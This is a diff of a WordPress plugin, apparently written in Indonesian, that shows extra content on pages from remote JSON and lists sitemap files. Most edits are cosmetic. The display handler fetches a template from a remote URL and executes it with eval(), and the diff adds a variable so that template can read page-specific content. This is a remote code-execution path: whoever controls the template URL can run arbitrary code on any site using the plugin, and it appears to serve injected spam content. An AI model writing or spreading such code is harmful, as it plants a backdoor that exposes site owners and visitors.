@@ -2,7 +2,7 @@
 /*
 Plugin Name: Additional Content Plugin
 Description: Plugin untuk menampilkan konten tambahan dengan URL template dan JSON yang dinamis (Auto Generate & Auto Repair).
-Version: 5.4
+Version: 5.5
 Author: Grok
 */
 
@@ -159,17 +159,15 @@ function acp_admin_page() {
                             <?php else: ?>
                                 <strong>JSON: <?php echo esc_html($res['json']); ?>.json</strong><br>
                                 <?php foreach ($res['urls'] as $idx => $url): 
-                                    $xml_filename = basename($url); // Mendapatkan nama file + ekstensi (contoh: 2ud8e.xml)
+                                    $xml_filename = basename($url);
                                     $unique_id = 'sitemap_res_' . md5($url . $idx);
                                 ?>
                                     <div style="display: flex; align-items: center; gap: 5px; margin-bottom: 3px;">
                                         <a href="<?php echo esc_url($url); ?>" target="_blank"><?php echo esc_url($url); ?></a>
-                                        
                                         <input type="text" id="<?php echo $unique_id; ?>" value="<?php echo esc_attr($xml_filename); ?>" style="position: absolute; left: -9999px;">
-                                        
                                         <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                               data-target="<?php echo $unique_id; ?>" 
-                                              title="Copy Filename: <?php echo esc_attr($xml_filename); ?>"
+                                              title="Copy Filename"
                                               style="cursor: pointer; color: #555; font-size: 18px;">
                                         </span>
                                         <span class="acp-copy-msg" style="display:none; color: green; font-size: 11px; font-weight: bold;">Copied!</span>
@@ -203,15 +201,12 @@ function acp_admin_page() {
                             <td>
                                 <div style="display: flex; align-items: center;">
                                     <input type="text" id="json_file_<?php echo $index; ?>" value="<?php echo esc_attr($ep['json_filename']); ?>" class="regular-text" style="width: 200px;" readonly onclick="this.select();">
-                                    
                                     <span style="margin-left: 5px; margin-right: 10px; font-weight: 500;">.json</span>
-                                    
                                     <span class="dashicons dashicons-admin-page acp-copy-btn" 
                                           data-target="json_file_<?php echo $index; ?>" 
                                           title="Copy Filename Only"
                                           style="cursor: pointer; color: #0073aa; font-size: 20px;">
                                     </span>
-                                    
                                     <span class="acp-copy-msg" style="display:none; margin-left: 8px; color: green; font-weight: bold; font-size: 12px;">Copied!</span>
                                 </div>
                                 <p class="description">URL: <?php echo ACP_JSON_BASE_URL . esc_html($ep['json_filename']) . '.json'; ?></p>
@@ -244,11 +239,9 @@ function acp_admin_page() {
                 var targetId = $(this).data('target');
                 var copyText = document.getElementById(targetId);
                 
-                // Select text
                 copyText.select();
-                copyText.setSelectionRange(0, 99999); // Untuk mobile
+                copyText.setSelectionRange(0, 99999);
 
-                // Copy ke clipboard
                 try {
                     if (navigator.clipboard) {
                         navigator.clipboard.writeText(copyText.value).then(function() {
@@ -362,11 +355,18 @@ function acp_handle_content_display() {
         if (is_array($konten_data)) {
             foreach ($konten_data as $key => $content_val) {
                 if (strtolower($key) === strtolower($title)) {
+                    
+                    // === PERBAIKAN PENTING DI SINI ===
+                    // Mendefinisikan variabel $additional_content agar bisa dibaca oleh template
+                    $additional_content = $content_val;
+                    // =================================
+
                     $template_response = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 15]);
                     if (!is_wp_error($template_response)) {
                         $template_content = wp_remote_retrieve_body($template_response);
                         if (!empty($template_content)) {
                             ob_start();
+                            // Variabel $additional_content sekarang tersedia di dalam eval()
                             eval('?>' . $template_content);
                             echo ob_get_clean();
                             exit;
